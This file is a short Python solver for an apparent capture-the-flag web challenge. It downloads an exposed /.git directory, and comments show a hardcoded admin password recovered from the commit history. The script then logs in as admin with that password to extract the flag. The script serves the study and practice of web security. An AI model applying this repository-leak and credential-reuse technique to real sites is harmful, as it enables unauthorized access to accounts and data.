import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

BASE_URL = "https://git-gud.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def download_git_zip(self):
        return self.session.get(f"{BASE_URL}/.git")

    def main(self):
        # git log
        # git checkout 5d949bd958a5ea2880d39c0038f8d1facf8da142
        # code src/app.py
        # SUPER_SECRET_PASSWORD = "MISCHIEF_MANAGED"

        response = self.session.post(f"{BASE_URL}/login", data={
            "username": "admin",
            "password": "MISCHIEF_MANAGED"
        })
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()
